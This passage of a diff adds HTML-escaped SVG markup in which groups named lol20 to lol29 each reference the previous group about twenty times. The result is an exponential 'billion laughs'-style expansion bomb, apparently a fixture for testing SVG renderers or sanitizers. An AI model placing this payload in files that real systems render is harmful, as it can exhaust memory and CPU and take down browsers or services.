+        &lt;\use x&#x3D;&quot;91.32223571159614&quot; y&#x3D;&quot;31.301504268513636&quot; xlink:href&#x3D;&quot;#lol20&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;88.90556040596917&quot; y&#x3D;&quot;81.75304255828905&quot; xlink:href&#x3D;&quot;#lol20&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;57.9740153571489&quot; y&#x3D;&quot;34.80540404306749&quot; xlink:href&#x3D;&quot;#lol20&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;61.73343357130982&quot; y&#x3D;&quot;99.13153948547695&quot; xlink:href&#x3D;&quot;#lol20&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;25.039595290674598&quot; y&#x3D;&quot;66.02666123026741&quot; xlink:href&#x3D;&quot;#lol20&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;69.48579383229834&quot; y&#x3D;&quot;21.55770718183686&quot; xlink:href&#x3D;&quot;#lol20&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;38.52706947747728&quot; y&#x3D;&quot;35.38011991383242&quot; xlink:href&#x3D;&quot;#lol20&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;66.62881195390263&quot; y&#x3D;&quot;9.421699554392992&quot; xlink:href&#x3D;&quot;#lol20&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;88.41546787897657&quot; y&#x3D;&quot;59.91463069572001&quot; xlink:href&#x3D;&quot;#lol20&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;12.19768109210786&quot; y&#x3D;&quot;81.0781856441533&quot; xlink:href&#x3D;&quot;#lol20&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol22&quot;&gt;
+        &lt;\use x&#x3D;&quot;50.85176960323887&quot; y&#x3D;&quot;7.946506433645206&quot; xlink:href&#x3D;&quot;#lol21&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;14.903149990134523&quot; y&#x3D;&quot;50.132200031761506&quot; xlink:href&#x3D;&quot;#lol21&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;15.997728056333294&quot; y&#x3D;&quot;87.67465304198207&quot; xlink:href&#x3D;&quot;#lol21&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;38.911759936878354&quot; y&#x3D;&quot;30.639602142253874&quot; xlink:href&#x3D;&quot;#lol21&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;96.13699803147284&quot; y&#x3D;&quot;86.20581992256999&quot; xlink:href&#x3D;&quot;#lol21&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;80.02833435646778&quot; y&#x3D;&quot;75.90824088626495&quot; xlink:href&#x3D;&quot;#lol21&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;47.526035197125594&quot; y&#x3D;&quot;41.04460967744924&quot; xlink:href&#x3D;&quot;#lol21&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;51.05146406813105&quot; y&#x3D;&quot;68.79409867716238&quot; xlink:href&#x3D;&quot;#lol21&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;85.38761391805038&quot; y&#x3D;&quot;49.98306603389965&quot; xlink:href&#x3D;&quot;#lol21&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;31.64813867290053&quot; y&#x3D;&quot;28.24099621649465&quot; xlink:href&#x3D;&quot;#lol21&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;59.237136339263444&quot; y&#x3D;&quot;64.27844526810237&quot; xlink:href&#x3D;&quot;#lol21&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;29.197781700218695&quot; y&#x3D;&quot;89.85603627952659&quot; xlink:href&#x3D;&quot;#lol21&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;5.849713612549257&quot; y&#x3D;&quot;95.49363478400433&quot; xlink:href&#x3D;&quot;#lol21&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;70.25017967771021&quot; y&#x3D;&quot;42.27433075234768&quot; xlink:href&#x3D;&quot;#lol21&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;5.367386467746926&quot; y&#x3D;&quot;58.20442316277268&quot; xlink:href&#x3D;&quot;#lol21&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;79.08756079102676&quot; y&#x3D;&quot;90.4460316882221&quot; xlink:href&#x3D;&quot;#lol21&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;7.911822177306305&quot; y&#x3D;&quot;49.810249679134245&quot; xlink:href&#x3D;&quot;#lol21&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;85.43322628533683&quot; y&#x3D;&quot;28.052415464203627&quot; xlink:href&#x3D;&quot;#lol21&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;51.79161310667908&quot; y&#x3D;&quot;19.562720658656897&quot; xlink:href&#x3D;&quot;#lol21&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;1.9101577908487877&quot; y&#x3D;&quot;28.541822117928362&quot; xlink:href&#x3D;&quot;#lol21&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol23&quot;&gt;
+        &lt;\use x&#x3D;&quot;18.642963887973263&quot; y&#x3D;&quot;81.12254306670378&quot; xlink:href&#x3D;&quot;#lol22&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;19.302094640331102&quot; y&#x3D;&quot;97.49961249470866&quot; xlink:href&#x3D;&quot;#lol22&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;34.59784046574214&quot; y&#x3D;&quot;55.31374055521623&quot; xlink:href&#x3D;&quot;#lol22&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;30.060245403072607&quot; y&#x3D;&quot;9.182136964886467&quot; xlink:href&#x3D;&quot;#lol22&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;66.09534737348639&quot; y&#x3D;&quot;13.39772492645933&quot; xlink:href&#x3D;&quot;#lol22&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;0.6403136325785042&quot; y&#x3D;&quot;15.88255901104364&quot; xlink:href&#x3D;&quot;#lol22&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;16.35260502582022&quot; y&#x3D;&quot;57.49592105833949&quot; xlink:href&#x3D;&quot;#lol22&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;33.669728075068605&quot; y&#x3D;&quot;76.01008970968662&quot; xlink:href&#x3D;&quot;#lol22&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;42.3273240147178&quot; y&#x3D;&quot;80.35323701989925&quot; xlink:href&#x3D;&quot;#lol22&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;27.459708339744225&quot; y&#x3D;&quot;27.742401208474952&quot; xlink:href&#x3D;&quot;#lol22&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;47.416739168133326&quot; y&#x3D;&quot;14.417463934537222&quot; xlink:href&#x3D;&quot;#lol22&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;59.89031973236651&quot; y&#x3D;&quot;11.037492470229394&quot; xlink:href&#x3D;&quot;#lol22&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;83.12071849153273&quot; y&#x3D;&quot;71.86751440168426&quot; xlink:href&#x3D;&quot;#lol22&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;64.35584050248174&quot; y&#x3D;&quot;23.79963022085667&quot; xlink:href&#x3D;&quot;#lol22&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;23.969231055698124&quot; y&#x3D;&quot;18.798386477372762&quot; xlink:href&#x3D;&quot;#lol22&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;30.94126566827513&quot; y&#x3D;&quot;77.2233376372106&quot; xlink:href&#x3D;&quot;#lol22&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;36.496862070481264&quot; y&#x3D;&quot;5.884388682444475&quot; xlink:href&#x3D;&quot;#lol22&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;94.74546377386216&quot; y&#x3D;&quot;22.770391899234042&quot; xlink:href&#x3D;&quot;#lol22&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;39.27480484093407&quot; y&#x3D;&quot;41.69813124337387&quot; xlink:href&#x3D;&quot;#lol22&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;9.001056577076195&quot; y&#x3D;&quot;26.429543393543586&quot; xlink:href&#x3D;&quot;#lol22&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol24&quot;&gt;
+        &lt;\use x&#x3D;&quot;29.478800560352305&quot; y&#x3D;&quot;13.328785581252511&quot; xlink:href&#x3D;&quot;#lol23&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;67.57297981282294&quot; y&#x3D;&quot;25.159044196998725&quot; xlink:href&#x3D;&quot;#lol23&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;93.84221172728819&quot; y&#x3D;&quot;26.544422684939818&quot; xlink:href&#x3D;&quot;#lol23&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;72.90324203473145&quot; y&#x3D;&quot;59.82368874580407&quot; xlink:href&#x3D;&quot;#lol23&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;32.78043402927368&quot; y&#x3D;&quot;54.804316000100705&quot; xlink:href&#x3D;&quot;#lol23&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;81.35343838736998&quot; y&#x3D;&quot;18.786405296135932&quot; xlink:href&#x3D;&quot;#lol23&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;77.8047264064634&quot; y&#x3D;&quot;78.86900868237366&quot; xlink:href&#x3D;&quot;#lol23&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;78.9309306510713&quot; y&#x3D;&quot;63.926627746596154&quot; xlink:href&#x3D;&quot;#lol23&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;60.17279123442194&quot; y&#x3D;&quot;26.105470491253826&quot; xlink:href&#x3D;&quot;#lol23&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;27.53545449873408&quot; y&#x3D;&quot;98.5242228630468&quot; xlink:href&#x3D;&quot;#lol23&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;98.85779914179768&quot; y&#x3D;&quot;16.112166075919443&quot; xlink:href&#x3D;&quot;#lol23&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;24.117014824049477&quot; y&#x3D;&quot;5.137665778099865&quot; xlink:href&#x3D;&quot;#lol23&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;11.926257055159606&quot; y&#x3D;&quot;44.24241697161276&quot; xlink:href&#x3D;&quot;#lol23&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;51.64271133882159&quot; y&#x3D;&quot;70.34677934437974&quot; xlink:href&#x3D;&quot;#lol23&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;62.78562162765658&quot; y&#x3D;&quot;49.174007083850654&quot; xlink:href&#x3D;&quot;#lol23&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;0.00478556694092358&quot; y&#x3D;&quot;23.920413010725216&quot; xlink:href&#x3D;&quot;#lol23&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;44.75441254315445&quot; y&#x3D;&quot;89.47081747605701&quot; xlink:href&#x3D;&quot;#lol23&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;1.4943250652559747&quot; y&#x3D;&quot;91.13761393871857&quot; xlink:href&#x3D;&quot;#lol23&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;20.016054966084727&quot; y&#x3D;&quot;77.79769358086925&quot; xlink:href&#x3D;&quot;#lol23&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;92.45564395107189&quot; y&#x3D;&quot;36.56420202353292&quot; xlink:href&#x3D;&quot;#lol23&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol25&quot;&gt;
+        &lt;\use x&#x3D;&quot;61.49023858404793&quot; y&#x3D;&quot;1.4935520679122294&quot; xlink:href&#x3D;&quot;#lol24&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;50.068472430228105&quot; y&#x3D;&quot;73.97610934663403&quot; xlink:href&#x3D;&quot;#lol24&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;36.573548016843894&quot; y&#x3D;&quot;47.13432062432963&quot; xlink:href&#x3D;&quot;#lol24&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;64.52281588791259&quot; y&#x3D;&quot;82.37514943651028&quot; xlink:href&#x3D;&quot;#lol24&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;42.588952913140155&quot; y&#x3D;&quot;22.090293752593283&quot; xlink:href&#x3D;&quot;#lol24&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;9.813348220761897&quot; y&#x3D;&quot;93.4566564707163&quot; xlink:href&#x3D;&quot;#lol24&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;22.684938214828986&quot; y&#x3D;&quot;48.2014374941929&quot; xlink:href&#x3D;&quot;#lol24&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;95.95980191770239&quot; y&#x3D;&quot;22.66514846504084&quot; xlink:href&#x3D;&quot;#lol24&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;97.1499256842756&quot; y&#x3D;&quot;62.353913029775676&quot; xlink:href&#x3D;&quot;#lol24&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;1.5866562804022655&quot; y&#x3D;&quot;75.07848752592955&quot; xlink:href&#x3D;&quot;#lol24&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;74.46415309374231&quot; y&#x3D;&quot;43.68701351689971&quot; xlink:href&#x3D;&quot;#lol24&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;65.13533896212195&quot; y&#x3D;&quot;52.88607618457243&quot; xlink:href&#x3D;&quot;#lol24&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;43.47965358721806&quot; y&#x3D;&quot;36.0340538766604&quot; xlink:href&#x3D;&quot;#lol24&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;39.06264338600551&quot; y&#x3D;&quot;56.016569358582366&quot; xlink:href&#x3D;&quot;#lol24&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;4.466594690341985&quot; y&#x3D;&quot;48.29557477409874&quot; xlink:href&#x3D;&quot;#lol24&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;53.59238127163574&quot; y&#x3D;&quot;24.315443368707946&quot; xlink:href&#x3D;&quot;#lol24&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;60.63267229226902&quot; y&#x3D;&quot;21.031076211945777&quot; xlink:href&#x3D;&quot;#lol24&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;45.36158841809006&quot; y&#x3D;&quot;58.4744627478259&quot; xlink:href&#x3D;&quot;#lol24&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;91.12731020713265&quot; y&#x3D;&quot;38.399003080488235&quot; xlink:href&#x3D;&quot;#lol24&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;45.02654234406306&quot; y&#x3D;&quot;48.811657642461135&quot; xlink:href&#x3D;&quot;#lol24&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol26&quot;&gt;
+        &lt;\use x&#x3D;&quot;92.60566784364298&quot; y&#x3D;&quot;74.05153369912102&quot; xlink:href&#x3D;&quot;#lol25&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;65.54343415304609&quot; y&#x3D;&quot;46.61582460437027&quot; xlink:href&#x3D;&quot;#lol25&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;84.66540324265819&quot; y&#x3D;&quot;44.733382229042576&quot; xlink:href&#x3D;&quot;#lol25&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;70.82287463686258&quot; y&#x3D;&quot;73.53438609884464&quot; xlink:href&#x3D;&quot;#lol25&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;51.456283300205065&quot; y&#x3D;&quot;30.893135126428895&quot; xlink:href&#x3D;&quot;#lol25&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;9.93990352274422&quot; y&#x3D;&quot;67.81899652590656&quot; xlink:href&#x3D;&quot;#lol25&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;32.19081259186801&quot; y&#x3D;&quot;14.032786608309355&quot; xlink:href&#x3D;&quot;#lol25&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;63.52472030557873&quot; y&#x3D;&quot;19.98758262527791&quot; xlink:href&#x3D;&quot;#lol25&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;91.87298416060838&quot; y&#x3D;&quot;93.53431040994973&quot; xlink:href&#x3D;&quot;#lol25&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;87.53378547605637&quot; y&#x3D;&quot;95.49387392705513&quot; xlink:href&#x3D;&quot;#lol25&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;64.49798377320367&quot; y&#x3D;&quot;9.086169600656458&quot; xlink:href&#x3D;&quot;#lol25&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;81.10815261293732&quot; y&#x3D;&quot;62.62425553540009&quot; xlink:href&#x3D;&quot;#lol25&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;20.89095402235538&quot; y&#x3D;&quot;63.71435380185173&quot; xlink:href&#x3D;&quot;#lol25&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;75.04290551048054&quot; y&#x3D;&quot;64.33063895642978&quot; xlink:href&#x3D;&quot;#lol25&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;65.66862501904443&quot; y&#x3D;&quot;67.37426005509167&quot; xlink:href&#x3D;&quot;#lol25&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;17.104128549267127&quot; y&#x3D;&quot;17.39879620347955&quot; xlink:href&#x3D;&quot;#lol25&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;0.6284463014389674&quot; y&#x3D;&quot;23.407575966989246&quot; xlink:href&#x3D;&quot;#lol25&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;73.25196807793833&quot; y&#x3D;&quot;16.53894323152588&quot; xlink:href&#x3D;&quot;#lol25&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;95.94191545209773&quot; y&#x3D;&quot;48.84190145002538&quot; xlink:href&#x3D;&quot;#lol25&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;7.84919415096863&quot; y&#x3D;&quot;2.0531367904397246&quot; xlink:href&#x3D;&quot;#lol25&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol27&quot;&gt;
+        &lt;\use x&#x3D;&quot;83.36452570151167&quot; y&#x3D;&quot;11.305136672984117&quot; xlink:href&#x3D;&quot;#lol26&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;3.4320056487018857&quot; y&#x3D;&quot;27.119849894367086&quot; xlink:href&#x3D;&quot;#lol26&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;82.7655621766746&quot; y&#x3D;&quot;37.5176481273319&quot; xlink:href&#x3D;&quot;#lol26&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;71.04419126838121&quot; y&#x3D;&quot;23.649705471411576&quot; xlink:href&#x3D;&quot;#lol26&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;79.39607816706734&quot; y&#x3D;&quot;42.480036614189956&quot; xlink:href&#x3D;&quot;#lol26&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;3.009024029292262&quot; y&#x3D;&quot;44.84967752569411&quot; xlink:href&#x3D;&quot;#lol26&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;66.30788308137107&quot; y&#x3D;&quot;38.746688115381325&quot; xlink:href&#x3D;&quot;#lol26&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;75.62438255886106&quot; y&#x3D;&quot;66.19556611978514&quot; xlink:href&#x3D;&quot;#lol26&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;37.56699107417399&quot; y&#x3D;&quot;12.532081357584413&quot; xlink:href&#x3D;&quot;#lol26&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;26.362942098161923&quot; y&#x3D;&quot;41.04876017566996&quot; xlink:href&#x3D;&quot;#lol26&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;81.0756886709334&quot; y&#x3D;&quot;10.000061023063001&quot; xlink:href&#x3D;&quot;#lol26&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;65.37750969325316&quot; y&#x3D;&quot;82.64851598289708&quot; xlink:href&#x3D;&quot;#lol26&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;30.616411776928864&quot; y&#x3D;&quot;29.236981683974506&quot; xlink:href&#x3D;&quot;#lol26&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;61.259251190709186&quot; y&#x3D;&quot;56.64716511078157&quot; xlink:href&#x3D;&quot;#lol26&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;33.6783584835428&quot; y&#x3D;&quot;86.57431925285347&quot; xlink:href&#x3D;&quot;#lol26&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;81.57317801577604&quot; y&#x3D;&quot;62.54143809925951&quot; xlink:href&#x3D;&quot;#lol26&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;13.776854863885069&quot; y&#x3D;&quot;50.72371595918569&quot; xlink:href&#x3D;&quot;#lol26&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;76.12807137042734&quot; y&#x3D;&quot;38.9819301248047&quot; xlink:href&#x3D;&quot;#lol26&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;33.9489231877101&quot; y&#x3D;&quot;60.964415636098465&quot; xlink:href&#x3D;&quot;#lol26&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;60.43864728118755&quot; y&#x3D;&quot;15.680127790948205&quot; xlink:href&#x3D;&quot;#lol26&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol28&quot;&gt;
+        &lt;\use x&#x3D;&quot;19.001885185549618&quot; y&#x3D;&quot;24.95825181911919&quot; xlink:href&#x3D;&quot;#lol27&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;55.566928588081275&quot; y&#x3D;&quot;77.04715294276112&quot; xlink:href&#x3D;&quot;#lol27&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;17.395615189914572&quot; y&#x3D;&quot;46.47934352601245&quot; xlink:href&#x3D;&quot;#lol27&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;83.68194642694068&quot; y&#x3D;&quot;50.708496887941536&quot; xlink:href&#x3D;&quot;#lol27&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;18.04239199670281&quot; y&#x3D;&quot;85.66049590017548&quot; xlink:href&#x3D;&quot;#lol27&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;41.42633501076529&quot; y&#x3D;&quot;66.52942763420701&quot; xlink:href&#x3D;&quot;#lol27&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;0.1067629091410005&quot; y&#x3D;&quot;38.630597654206156&quot; xlink:href&#x3D;&quot;#lol27&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;66.33183873487829&quot; y&#x3D;&quot;69.87683351968265&quot; xlink:href&#x3D;&quot;#lol27&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;97.39349045117481&quot; y&#x3D;&quot;55.70517529249044&quot; xlink:href&#x3D;&quot;#lol27&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;35.08906000255114&quot; y&#x3D;&quot;36.32267377230317&quot; xlink:href&#x3D;&quot;#lol27&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;55.614574219506295&quot; y&#x3D;&quot;37.27494008478129&quot; xlink:href&#x3D;&quot;#lol27&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;71.70057518871994&quot; y&#x3D;&quot;68.67585883711764&quot; xlink:href&#x3D;&quot;#lol27&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;17.674205841872382&quot; y&#x3D;&quot;18.872513806691828&quot; xlink:href&#x3D;&quot;#lol27&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;19.525219346022936&quot; y&#x3D;&quot;98.65905813569756&quot; xlink:href&#x3D;&quot;#lol27&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;30.29353419798958&quot; y&#x3D;&quot;15.520159471422513&quot; xlink:href&#x3D;&quot;#lol27&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;92.1682882463876&quot; y&#x3D;&quot;51.39352055133707&quot; xlink:href&#x3D;&quot;#lol27&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;5.951341385203435&quot; y&#x3D;&quot;92.02221647082108&quot; xlink:href&#x3D;&quot;#lol27&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;29.55863778941722&quot; y&#x3D;&quot;19.329518506911892&quot; xlink:href&#x3D;&quot;#lol27&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;55.89410303989703&quot; y&#x3D;&quot;97.09010234984733&quot; xlink:href&#x3D;&quot;#lol27&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;5.67390759983425&quot; y&#x3D;&quot;14.603672471932716&quot; xlink:href&#x3D;&quot;#lol27&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol29&quot;&gt;
+        &lt;\use x&#x3D;&quot;74.0977645084419&quot; y&#x3D;&quot;75.68847236058184&quot; xlink:href&#x3D;&quot;#lol28&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;69.18669535140695&quot; y&#x3D;&quot;83.64172908361408&quot; xlink:href&#x3D;&quot;#lol28&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;43.219060233928474&quot; y&#x3D;&quot;65.48253565154485&quot; xlink:href&#x3D;&quot;#lol28&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;58.98664502190436&quot; y&#x3D;&quot;93.40205527939132&quot; xlink:href&#x3D;&quot;#lol28&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;32.09090855939939&quot; y&#x3D;&quot;5.563797900817525&quot; xlink:href&#x3D;&quot;#lol28&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;26.00501021293683&quot; y&#x3D;&quot;96.82211872476077&quot; xlink:href&#x3D;&quot;#lol28&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;59.797101704930625&quot; y&#x3D;&quot;4.754018739318044&quot; xlink:href&#x3D;&quot;#lol28&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;34.680635449710074&quot; y&#x3D;&quot;33.36390188721702&quot; xlink:href&#x3D;&quot;#lol28&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;13.530020231641583&quot; y&#x3D;&quot;69.79365081111743&quot; xlink:href&#x3D;&quot;#lol28&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;71.33657777882026&quot; y&#x3D;&quot;89.79991126994851&quot; xlink:href&#x3D;&quot;#lol28&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;76.96511766926464&quot; y&#x3D;&quot;77.21993372341302&quot; xlink:href&#x3D;&quot;#lol28&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;98.46494595777506&quot; y&#x3D;&quot;92.76775399227672&quot; xlink:href&#x3D;&quot;#lol28&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;75.99319482556794&quot; y&#x3D;&quot;51.56872750274587&quot; xlink:href&#x3D;&quot;#lol28&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;2.560705562778509&quot; y&#x3D;&quot;71.70560925872576&quot; xlink:href&#x3D;&quot;#lol28&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;78.13121238089376&quot; y&#x3D;&quot;75.43478720701124&quot; xlink:href&#x3D;&quot;#lol28&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;33.53948051952595&quot; y&#x3D;&quot;90.10812163289295&quot; xlink:href&#x3D;&quot;#lol28&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;84.85460614795241&quot; y&#x3D;&quot;39.943535159711715&quot; xlink:href&#x3D;&quot;#lol28&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;42.03022261477909&quot; y&#x3D;&quot;13.193173679309167&quot; xlink:href&#x3D;&quot;#lol28&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;60.7463764278035&quot; y&#x3D;&quot;68.75806632479848&quot; xlink:href&#x3D;&quot;#lol28&quot; &#x2F;&gt;
